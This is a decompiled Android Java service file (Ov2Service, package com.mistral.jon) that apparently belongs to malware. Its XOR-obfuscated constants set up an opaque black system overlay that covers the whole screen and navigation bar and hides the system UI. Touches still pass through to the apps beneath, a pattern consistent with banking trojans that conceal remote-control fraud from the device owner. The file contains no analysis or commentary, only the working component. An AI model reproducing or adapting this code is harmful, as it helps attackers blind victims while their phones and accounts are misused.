package com.mistral.jon.services;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.WindowManager.LayoutParams;
import android.view.WindowManager;
import z.ban;

public class Ov2Service extends Service {
    private static final String a;
    private static long[] a;
    private View a;
    private WindowManager a;

    static {
        long[] arr_v = new long[5];
        Ov2Service.a = arr_v;
        arr_v[0] = 0x2DBF4439L;
        arr_v[1] = 0xFFFFFFFF9A1A4030L;
        arr_v[2] = 45502061L;
        arr_v[3] = 0xFFFFFFFF8BC014F6L;
        arr_v[4] = 0x204828E1L;
        Ov2Service.a = "OvService";
    }

    public Ov2Service() {
        this.a = null;
    }

    private View a() {
        View view0 = new View(this);
        view0.setSystemUiVisibility(0x1006);
        view0.setBackgroundColor(((int)Ov2Service.a[1]) ^ 0x651A4030);
        return view0;
    }

    private WindowManager.LayoutParams a() {
        WindowManager.LayoutParams windowManager$LayoutParams0 = new WindowManager.LayoutParams(-1, -1, 0x7F6, ((int)Ov2Service.a[2]) ^ 45502045, ((int)Ov2Service.a[3]) ^ 0x743FEB0B);
        windowManager$LayoutParams0.gravity = ((int)Ov2Service.a[2]) ^ 45502045;
        DisplayMetrics displayMetrics0 = new DisplayMetrics();
        this.a.getDefaultDisplay().getMetrics(displayMetrics0);
        windowManager$LayoutParams0.width = displayMetrics0.widthPixels;
        windowManager$LayoutParams0.height = displayMetrics0.heightPixels + 2000;
        return windowManager$LayoutParams0;
    }

    private void a() {
        if(this.a == null) {
            try {
                this.a = this.a();
                WindowManager.LayoutParams windowManager$LayoutParams0 = this.a();
                this.a.addView(this.a, windowManager$LayoutParams0);
                ban.a("Showed", "OvService");
            }
            catch(Exception exception0) {
                ban.a(exception0.toString(), "OvService", ((int)Ov2Service.a[4]) ^ 0x204828E7);
                this.a = null;
            }
        }
    }

    private void b() {
        View view0 = this.a;
        if(view0 != null) {
            this.a.removeView(view0);
            this.a = null;
            ban.a("Hided", "OvService");
        }
    }

    @Override  // android.app.Service
    public IBinder onBind(Intent intent0) {
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override  // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.a = (WindowManager)this.getSystemService("window");
    }

    @Override  // android.app.Service
    public void onDestroy() {
        super.onDestroy();
        this.b();
    }

    @Override  // android.app.Service
    public int onStartCommand(Intent intent0, int v, int v1) {
        this.a();
        return ((int)Ov2Service.a[0]) ^ 767509560;
    }
}

